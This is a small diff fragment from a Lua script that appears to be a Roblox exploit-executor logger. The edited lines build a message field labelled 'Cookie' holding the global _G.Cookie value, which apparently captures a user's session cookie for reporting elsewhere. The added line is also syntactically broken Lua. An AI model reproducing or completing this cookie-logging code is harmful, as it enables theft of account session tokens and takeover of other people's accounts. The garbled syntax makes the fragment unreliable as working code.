@@ -21,7 +21,7 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                     },
                     {
                         ["name"]= "Cookie",
-                        ["value"]= "Cookie: " .. _G.Cookie,
+                        ["value"]= "Cookie: " .. "```"_G.Cookie"```",
                         ["inline"]= true
                     },
                 }              
